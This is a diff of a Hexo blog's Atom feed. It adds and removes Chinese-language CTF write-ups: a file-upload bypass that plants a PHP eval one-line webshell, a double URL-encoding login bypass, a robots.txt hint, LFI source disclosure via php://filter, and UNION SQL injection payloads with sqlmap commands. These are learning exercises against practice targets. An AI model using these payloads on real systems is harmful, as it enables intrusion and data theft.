@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://yoursite.com/"/>
-  <updated>2019-11-16T05:11:20.871Z</updated>
+  <updated>2019-11-17T03:32:26.569Z</updated>
   <id>http://yoursite.com/</id>
   
   <author>
@@ -15,6 +15,84 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>upload1</title>
+    <link href="http://yoursite.com/2019/11/17/upload1/"/>
+    <id>http://yoursite.com/2019/11/17/upload1/</id>
+    <published>2019-11-17T03:21:43.000Z</published>
+    <updated>2019-11-17T03:32:26.569Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="src-攻防世界-upload1"><a href="#src-攻防世界-upload1" class="headerlink" title="[src = 攻防世界] upload1"></a>[src = 攻防世界] upload1</h2><h3 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h3><p>明显的文件上传漏洞。本题是基于js的前段校验。代码如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">upfile = <span class="built_in">document</span>.getElementById(<span class="string">"upfile"</span>);</span><br><span class="line">submit = <span class="built_in">document</span>.getElementById(<span class="string">"submit"</span>);</span><br><span class="line">name = upfile.value;</span><br><span class="line">ext = name.replace(<span class="regexp">/^.+\./</span>,<span class="string">''</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>([<span class="string">'jpg'</span>,<span class="string">'png'</span>].contains(ext))&#123;</span><br><span class="line">    submit.disabled = <span class="literal">false</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    submit.disabled = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    alert(<span class="string">'请选择一张图片文件上传!'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>只允许jpg和png格式，但是我们知道前段校验可以非常容易对绕过。我们首先写一个一句话木马：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_POST[<span class="string">'bitsec'</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>然后将文件后缀改为jpg，然后设置代理，通过burp进行抓包，如图</p><p><img src="./upload1-1.PNG" alt="upload1"></p><p>将其中的后缀改为php，然后forward即可上传成功，如图。</p><p><img src="./upload1-2.PNG" alt="upload1"></p><p>页面回显：upload success : upload/1573961293.123.php </p><p>通过中国菜刀等webshell工具连接成功，如图：</p><p><img src="./upload1-3.PNG" alt="upload1"></p><p>访问目录，发现flag.php文件，打开就得到flag：</p><p><img src="./upload1-4.PNG" alt="upload1"></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h2 id=&quot;src-攻防世界-upload1&quot;&gt;&lt;a href=&quot;#src-攻防世界-upload1&quot; class=&quot;headerlink&quot; title=&quot;[src = 攻防世界] upload1&quot;&gt;&lt;/a&gt;[src = 攻防世界] upload1&lt;/h2&gt;&lt;h3 id=&quot;W
+      
+    
+    </summary>
+    
+    
+      <category term="WEB" scheme="http://yoursite.com/categories/WEB/"/>
+    
+    
+      <category term="文件上传，一句话木马，webshell" scheme="http://yoursite.com/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%EF%BC%8C%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%EF%BC%8Cwebshell/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>PHP2</title>
+    <link href="http://yoursite.com/2019/11/17/PHP2/"/>
+    <id>http://yoursite.com/2019/11/17/PHP2/</id>
+    <published>2019-11-17T02:55:46.000Z</published>
+    <updated>2019-11-17T03:22:20.623Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="src-攻防世界-PHP2"><a href="#src-攻防世界-PHP2" class="headerlink" title="[src = 攻防世界] PHP2"></a>[src = 攻防世界] PHP2</h2><h3 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h3><p>熟悉php的应该知道phps文件可以用来读取php代码，这里就是可以看到此问题导致对源码泄露，直接访问index.phps，得到源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="string">"admin"</span>===$_GET[id]) &#123;</span><br><span class="line">  <span class="keyword">echo</span>(<span class="string">"&lt;p&gt;not allowed!&lt;/p&gt;"</span>);</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$_GET[id] = urldecode($_GET[id]);</span><br><span class="line"><span class="keyword">if</span>($_GET[id] == <span class="string">"admin"</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Access granted!&lt;/p&gt;"</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Key: xxxxxxx &lt;/p&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">Can you anthenticate to this website?</span><br></pre></td></tr></table></figure><p>需要满足两个条件：<br>第一步，要使得”admin”===$_GET[id]不成立</p><p>第二步，经过$_GET[id] = urldecode($_GET[id]);，使得$_GET[id] == “admin”成立。</p><p>看似矛盾，关键在理解urldecode函数的行为，其解释为解码给出的已编码字符串中的任何 %##。 加号（’+’）被解码成一个空格字符。</p><p>因为当将URL传递给$_GET[id]时，会进行第一次url解码，这时要求不能解码得到admin，然后再次交给urldecode进行url解码，这次要得到admin。<br>所以构造下面对payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=%<span class="number">2561</span>dmin</span><br></pre></td></tr></table></figure><p>第一次url解码得到（将%25解码成%）：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=%<span class="number">61</span>dmin</span><br></pre></td></tr></table></figure><p>此时满足了第一步的条件。然后第二次交给urldecode函数，这次将%61解码成字符a，变为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=admin</span><br></pre></td></tr></table></figure><p>满足第二步条件，得到flag。</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h2 id=&quot;src-攻防世界-PHP2&quot;&gt;&lt;a href=&quot;#src-攻防世界-PHP2&quot; class=&quot;headerlink&quot; title=&quot;[src = 攻防世界] PHP2&quot;&gt;&lt;/a&gt;[src = 攻防世界] PHP2&lt;/h2&gt;&lt;h3 id=&quot;WP&quot;&gt;&lt;a href=&quot;
+      
+    
+    </summary>
+    
+    
+      <category term="WEB" scheme="http://yoursite.com/categories/WEB/"/>
+    
+    
+      <category term="信息泄露，URL编码与解码" scheme="http://yoursite.com/tags/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%EF%BC%8CURL%E7%BC%96%E7%A0%81%E4%B8%8E%E8%A7%A3%E7%A0%81/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Training-WWW-Robots</title>
+    <link href="http://yoursite.com/2019/11/17/Training-WWW-Robots/"/>
+    <id>http://yoursite.com/2019/11/17/Training-WWW-Robots/</id>
+    <published>2019-11-17T02:41:23.000Z</published>
+    <updated>2019-11-17T02:44:09.998Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="src-攻防世界-Training-WWW-Robots"><a href="#src-攻防世界-Training-WWW-Robots" class="headerlink" title="[src = 攻防世界] Training-WWW-Robots"></a>[src = 攻防世界] Training-WWW-Robots</h2><h3 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h3><p>都提示Robots了，直接访问：<br>&lt;网址&gt;/robots.txt<br>得到</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /fl0g.php</span><br><span class="line"></span><br><span class="line">User-agent: Yandex</span><br><span class="line">Disallow: *</span><br></pre></td></tr></table></figure><p>然后访问/fl0g.php得到flag</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h2 id=&quot;src-攻防世界-Training-WWW-Robots&quot;&gt;&lt;a href=&quot;#src-攻防世界-Training-WWW-Robots&quot; class=&quot;headerlink&quot; title=&quot;[src = 攻防世界] Training-WWW-Robots&quot;&gt;&lt;/
+      
+    
+    </summary>
+    
+    
+      <category term="WEB" scheme="http://yoursite.com/categories/WEB/"/>
+    
+    
+      <category term="robots" scheme="http://yoursite.com/tags/robots/"/>
+    
+  </entry>
   
   <entry>
     <title>lottery</title>
@@ -440,81 +518,6 @@
     
     
       <category term="Commnd Execution" scheme="http://yoursite.com/tags/Commnd-Execution/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>LFI</title>
-    <link href="http://yoursite.com/2019/09/30/LFI/"/>
-    <id>http://yoursite.com/2019/09/30/LFI/</id>
-    <published>2019-09-30T08:08:52.000Z</published>
-    <updated>2019-11-15T06:15:27.966Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="src-hackme-LFI"><a href="#src-hackme-LFI" class="headerlink" title="[src = hackme] LFI"></a>[src = hackme] LFI</h2><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>What this admin’s password? That is not important at all, just get the flag.<br>Tips: LFI, php://filter</p> <a id="more"></a><h2 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h2><p>点击题目，跳转到题目页面。网页的URL为：<a href="https://hackme.inndy.tw/lfi/?page=pages/index" target="_blank" rel="noopener">https://hackme.inndy.tw/lfi/?page=pages/index</a></p><p>点击Introduction时，URL变为：<a href="https://hackme.inndy.tw/lfi/?page=pages/intro" target="_blank" rel="noopener">https://hackme.inndy.tw/lfi/?page=pages/intro</a></p><p>点击Login时，URL变为：<a href="https://hackme.inndy.tw/lfi/?page=pages/login" target="_blank" rel="noopener">https://hackme.inndy.tw/lfi/?page=pages/login</a></p><p>可以看到参数page为文件包含,题目对提示也是本地文件包含（LFI，Local file inclusion），还有一种是远程文件包含（RFI、Remote file inclusion）。php中常见的文件包含函数有以下四种：<br>include()<br>require()<br>include_once()<br>require()_once()</p><p>当利用这四个函数来包含文件时，不管文件是什么类型（图片、txt等等），都会直接作为php文件进行解析。<br>示例代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $file=$__GET[<span class="string">'page'</span>];</span><br><span class="line">    <span class="keyword">include</span> $file;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure><p>或者通过后天添加后缀对方式：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $file=$__GET[<span class="string">'page'</span>].<span class="string">"php"</span>;</span><br><span class="line">    <span class="keyword">include</span> $file;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure><p>题目提示不要管admin和密码，所以猜测是不是有一个flag的文件，可以包含进来。尝试<br><a href="https://hackme.inndy.tw/lfi/?page=pages/flag" target="_blank" rel="noopener">https://hackme.inndy.tw/lfi/?page=pages/flag</a><br>显示下面的页面：<br><img src="./lfi1.PNG" alt="lfi"><br>页面提示“Can you read the flag?”。</p><p>再看题目的第二个提示，php://filter，因为LFI只能读取到非php文件的源码，所以对PHP文件只能解析执行，所以要看到PHP文件的源码，需要通过通过php伪协议php://filter/read=convert.base64-encode/resource= 利用LFI来查看源码。构造下面的URL：<br><a href="https://hackme.inndy.tw/lfi/?page=php://filter/read=convert.base64-encode/resource=pages/flag" target="_blank" rel="noopener">https://hackme.inndy.tw/lfi/?page=php://filter/read=convert.base64-encode/resource=pages/flag</a><br>得到一串Base64解码得到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Can you read the flag<span class="meta">&lt;?php</span> <span class="keyword">require</span>(<span class="string">'config.php'</span>); <span class="meta">?&gt;</span>?</span><br></pre></td></tr></table></figure><p>再尝试同样的方式读取config.php（<a href="https://hackme.inndy.tw/lfi/?page=php://filter/read=convert.base64-encode/resource=pages/config）" target="_blank" rel="noopener">https://hackme.inndy.tw/lfi/?page=php://filter/read=convert.base64-encode/resource=pages/config）</a>.得到的base64解码得到flag：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$flag = <span class="string">"FLAG&#123;Yoooooo_LFI_g00d_2cXxsXSYP9EVLrIo&#125;"</span>;</span><br></pre></td></tr></table></figure><p>补充：php其他对伪协议<br>php://input:可以读取没有处理过的POST数据,不依赖于特定的php.ini指令。当enctype=”multipart/form-data” 的时候 php://input 是无效的。</p><h2 id="知识点"><a href="#知识点" class="headerlink" title="[知识点]"></a>[知识点]</h2><p>本地文件包含是一个重要的Web漏洞，结合php://filter/可以泄露源码。</p>]]></content>
-    
-    <summary type="html">
-    
-      &lt;h2 id=&quot;src-hackme-LFI&quot;&gt;&lt;a href=&quot;#src-hackme-LFI&quot; class=&quot;headerlink&quot; title=&quot;[src = hackme] LFI&quot;&gt;&lt;/a&gt;[src = hackme] LFI&lt;/h2&gt;&lt;h2 id=&quot;题目描述&quot;&gt;&lt;a href=&quot;#题目描述&quot; class=&quot;headerlink&quot; title=&quot;题目描述&quot;&gt;&lt;/a&gt;题目描述&lt;/h2&gt;&lt;p&gt;What this admin’s password? That is not important at all, just get the flag.&lt;br&gt;Tips: LFI, php://filter&lt;/p&gt;
-    
-    </summary>
-    
-    
-      <category term="WEB" scheme="http://yoursite.com/categories/WEB/"/>
-    
-    
-      <category term="LFI" scheme="http://yoursite.com/tags/LFI/"/>
-    
-      <category term="本地文件包含" scheme="http://yoursite.com/tags/%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
-    
-      <category term="php://filter" scheme="http://yoursite.com/tags/php-filter/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>homepage</title>
-    <link href="http://yoursite.com/2019/09/30/homepage/"/>
-    <id>http://yoursite.com/2019/09/30/homepage/</id>
-    <published>2019-09-30T07:49:54.000Z</published>
-    <updated>2019-09-30T08:09:11.824Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="src-hackme-homepage"><a href="#src-hackme-homepage" class="headerlink" title="[src = hackme] homepage"></a>[src = hackme] homepage</h2><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>Where is the flag? Did you check the code?</p> <a id="more"></a><h2 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h2><p>点击题目，跳转到网站主页。题目提示要检查主页的代码，按照惯例，查看主页源代码，在最后发现cute.js：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=<span class="string">"cute.js"</span>&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>打开，发现下面的内容：</p><p><img src="./cute.PNG" alt="cute"></p><p>将这段代码放到火狐浏览器的控制台（F12），执行得到一个二维码，扫码得到flag：</p><p><img src="./cute1.PNG" alt="cute"></p><h2 id="知识点"><a href="#知识点" class="headerlink" title="[知识点]"></a>[知识点]</h2><p>JavaScript是前端脚本语言，比如XSS等漏洞就出现在其中，浏览器的F12功能在调试浏览器代码过程中也非常有用！</p>]]></content>
-    
-    <summary type="html">
-    
-      &lt;h2 id=&quot;src-hackme-homepage&quot;&gt;&lt;a href=&quot;#src-hackme-homepage&quot; class=&quot;headerlink&quot; title=&quot;[src = hackme] homepage&quot;&gt;&lt;/a&gt;[src = hackme] homepage&lt;/h2&gt;&lt;h2 id=&quot;题目描述&quot;&gt;&lt;a href=&quot;#题目描述&quot; class=&quot;headerlink&quot; title=&quot;题目描述&quot;&gt;&lt;/a&gt;题目描述&lt;/h2&gt;&lt;p&gt;Where is the flag? Did you check the code?&lt;/p&gt;
-    
-    </summary>
-    
-    
-      <category term="WEB" scheme="http://yoursite.com/categories/WEB/"/>
-    
-    
-      <category term="JavaScript" scheme="http://yoursite.com/tags/JavaScript/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>guestbook</title>
-    <link href="http://yoursite.com/2019/09/30/guestbook/"/>
-    <id>http://yoursite.com/2019/09/30/guestbook/</id>
-    <published>2019-09-30T06:40:39.000Z</published>
-    <updated>2019-09-30T07:42:23.464Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="src-hackme-guestbook"><a href="#src-hackme-guestbook" class="headerlink" title="[src = hackme] guestbook"></a>[src = hackme] guestbook</h2><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>This guestbook sucks. sqlmap is your friend.</p> <a id="more"></a><h2 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h2><p>点击Message List，发现没有消息，通过New Post添加一条，然后再查看可以看到POST的消息，这是一个留言板，添加消息后结果如图：</p><p><img src="./guestbook.PNG" alt="guest"></p><p>题目的提示已经说明这是一个SQL注入题目，现在查看注入点，点击添加的消息，发现URL为：<a href="https://hackme.inndy.tw/gb/?mod=read&amp;id=13362" target="_blank" rel="noopener">https://hackme.inndy.tw/gb/?mod=read&amp;id=13362</a>。<br>测试后面的id字段：添加’，输出Sorry, no data for this。说明存在注入。</p><p>按照注入的基本步骤，首先数据库名，表名，字段然后数据的次序进行。<br>使用union注入，需要测试后面的列数，测试到4时（?mod=read&amp;id=-1 union select 1,2,3,4 #），输出结果如下：<br>（id=-1是使得前面的字句没有返回，这样页面就可以显示union后面字句查询的内容）<br><img src="./sql1.PNG" alt="guest1"><br>其中显示2,3,4的位置都是有输出的位置，可以用来显示注入得到的数据。</p><p>注入数据库名字，在第3列显示：<br>&lt;<a href="https://hackme.inndy.tw/gb/?mod=read&amp;id=-1" target="_blank" rel="noopener">https://hackme.inndy.tw/gb/?mod=read&amp;id=-1</a> union select 1,2,database(),4#&gt;<br>得到数据库名字为g8.</p><p>执行<br>&lt;<a href="https://hackme.inndy.tw/gb/?mod=read&amp;id=-1" target="_blank" rel="noopener">https://hackme.inndy.tw/gb/?mod=read&amp;id=-1</a> union select 1,2,(select table_name from information_schema.tables where table_schema=database() limit 0,1),4#&gt;<br>得到表名为flag的表。</p><p>测试flag表的字段，输入如下的注入语句时得到flag字段。<br>?mod=read&amp;id=-1 union select 1,2,(select column_name from information_schema.columns where table_name=’flag’ limit 1,1),4#</p><p>最后一步获取字段的值：<br>?mod=read&amp;id=-1 union select 1,2,(select flag from flag limit 1,1),4#</p><p>得到如下输出，即为flag：<br><img src="./sql2.PNG" alt="guest1"></p><p>本题已经提示了可以使用sqlmap，所以本题的第二种解法就是使用sqlmap，sqlmap是进行SQL注入的神器，KALI系统已经集成，所以直接上KALI。<br>首先测试注入点（-u 参数为测试注入的URL，–cookie 参数为注入会话的cookie）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># sqlmap -u "https://hackme.inndy.tw/gb/?mod=read&amp;id=13364" --cookie "session_guard=3ngmoq8clc2jefsgcfpc9s402h; session=SESSION.lJ4qf2bU0z4Z2XCc%2Feq3RY26YacSZWovoheaH%2F2%2B9T6eymykeml1JR9y6fRruwJ8ff22V0py5D%2B5dIHJnhzkVA%3D%3D.bmFtZXxzOjY6ImJpdHNlYyI7.1570086312; _ga=GA1.2.1257329668.1569639522; _gid=GA1.2.1376482708.1569827111; _gat=1"</span></span><br></pre></td></tr></table></figure><p>输出显示id字段是可注入的（GET parameter ‘id’ is vulnerable.）。<br>注入数据库名字（–dbs参数）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># sqlmap -u "https://hackme.inndy.tw/gb/?mod=read&amp;id=13364" --cookie "session_guard=3ngmoq8clc2jefsgcfpc9s402h; session=SESSION.lJ4qf2bU0z4Z2XCc%2Feq3RY26YacSZWovoheaH%2F2%2B9T6eymykeml1JR9y6fRruwJ8ff22V0py5D%2B5dIHJnhzkVA%3D%3D.bmFtZXxzOjY6ImJpdHNlYyI7.1570086312; _ga=GA1.2.1257329668.1569639522; _gid=GA1.2.1376482708.1569827111; _gat=1"  --dbs</span></span><br></pre></td></tr></table></figure><p>得到三个数据库：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">available databases [3]:</span><br><span class="line">[*] g8</span><br><span class="line">[*] guestbook</span><br><span class="line">[*] information_schema</span><br></pre></td></tr></table></figure><p>information_schema是MySQL自带的管理数据库的数据库，我们先测试g8，看g8中存在那些表。-D参数指定要测试的数据库为g8，–tables参数说明要查看所有表名。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># sqlmap -u "https://hackme.inndy.tw/gb/?mod=read&amp;id=13364" --cookie "session_guard=3ngmoq8clc2jefsgcfpc9s402h; session=SESSION.lJ4qf2bU0z4Z2XCc%2Feq3RY26YacSZWovoheaH%2F2%2B9T6eymykeml1JR9y6fRruwJ8ff22V0py5D%2B5dIHJnhzkVA%3D%3D.bmFtZXxzOjY6ImJpdHNlYyI7.1570086312; _ga=GA1.2.1257329668.1569639522; _gid=GA1.2.1376482708.1569827111; _gat=1"  -D g8 --tables</span></span><br></pre></td></tr></table></figure><p>得到：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Database: g8</span><br><span class="line">[3 tables]</span><br><span class="line">+-------+</span><br><span class="line">| flag  |</span><br><span class="line">| posts |</span><br><span class="line">| users |</span><br><span class="line">+-------+</span><br></pre></td></tr></table></figure><p>发现flag表，flag很可能就在这个表中，所以我们直接对该表进行字段猜测,-T 参数指定表名，–columns 说明要查询所有字段名：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># sqlmap -u "https://hackme.inndy.tw/gb/?mod=read&amp;id=13364" --cookie "session_guard=3ngmoq8clc2jefsgcfpc9s402h; session=SESSION.lJ4qf2bU0z4Z2XCc%2Feq3RY26YacSZWovoheaH%2F2%2B9T6eymykeml1JR9y6fRruwJ8ff22V0py5D%2B5dIHJnhzkVA%3D%3D.bmFtZXxzOjY6ImJpdHNlYyI7.1570086312; _ga=GA1.2.1257329668.1569639522; _gid=GA1.2.1376482708.1569827111; _gat=1"  -D g8 -T flag --columns</span></span><br></pre></td></tr></table></figure><p>得到：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Database: g8</span><br><span class="line">Table: flag</span><br><span class="line">[4 columns]</span><br><span class="line">+----------+--------------+</span><br><span class="line">| Column   | Type         |</span><br><span class="line">+----------+--------------+</span><br><span class="line">| flag     | varchar(255) |</span><br><span class="line">| id       | int(11)      |</span><br><span class="line">| padding0 | int(11)      |</span><br><span class="line">| padding1 | int(11)      |</span><br><span class="line">+----------+--------------+</span><br></pre></td></tr></table></figure><p>有flag字段，最后dump该表的内容即可！</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># sqlmap -u "https://hackme.inndy.tw/gb/?mod=read&amp;id=13364" --cookie "session_guard=3ngmoq8clc2jefsgcfpc9s402h; session=SESSION.lJ4qf2bU0z4Z2XCc%2Feq3RY26YacSZWovoheaH%2F2%2B9T6eymykeml1JR9y6fRruwJ8ff22V0py5D%2B5dIHJnhzkVA%3D%3D.bmFtZXxzOjY6ImJpdHNlYyI7.1570086312; _ga=GA1.2.1257329668.1569639522; _gid=GA1.2.1376482708.1569827111; _gat=1"  -D g8 -T flag --columns --dump</span></span><br></pre></td></tr></table></figure><p>得到flag：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Database: g8</span><br><span class="line">Table: flag</span><br><span class="line">[3 entries]</span><br><span class="line">+----+----------------------------------------------------+----------+----------+</span><br><span class="line">| id | flag                                               | padding1 | padding0 |</span><br><span class="line">+----+----------------------------------------------------+----------+----------+</span><br><span class="line">| 1  | http://i.giphy.com/3o72FdPiRXBRbBLUc0.gif          | 31415926 | 1337     |</span><br><span class="line">| 2  | FLAG&#123;Y0U_KN0W_SQL_1NJECT10N!!!<span class="string">' or 595342&gt;123123#&#125; | 88       | 77       |</span></span><br><span class="line"><span class="string">| 3  | http://i.giphy.com/m7BTtLWhjkEJa.gif               | 9999     | 6666     |</span></span><br><span class="line"><span class="string">+----+----------------------------------------------------+----------+----------+</span></span><br></pre></td></tr></table></figure><h2 id="知识点"><a href="#知识点" class="headerlink" title="[知识点]"></a>[知识点]</h2><p>sql注入是最为危险的web安全问题之一，通过该例子可以很好的练习手动注入的过程，建议通过手动注入的方式进行。</p>]]></content>
-    
-    <summary type="html">
-    
-      &lt;h2 id=&quot;src-hackme-guestbook&quot;&gt;&lt;a href=&quot;#src-hackme-guestbook&quot; class=&quot;headerlink&quot; title=&quot;[src = hackme] guestbook&quot;&gt;&lt;/a&gt;[src = hackme] guestbook&lt;/h2&gt;&lt;h2 id=&quot;题目描述&quot;&gt;&lt;a href=&quot;#题目描述&quot; class=&quot;headerlink&quot; title=&quot;题目描述&quot;&gt;&lt;/a&gt;题目描述&lt;/h2&gt;&lt;p&gt;This guestbook sucks. sqlmap is your friend.&lt;/p&gt;
-    
-    </summary>
-    
-    
-      <category term="WEB" scheme="http://yoursite.com/categories/WEB/"/>
-    
-    
-      <category term="SQLi" scheme="http://yoursite.com/tags/SQLi/"/>
-    
-      <category term="sqlmap" scheme="http://yoursite.com/tags/sqlmap/"/>
     
   </entry>
   
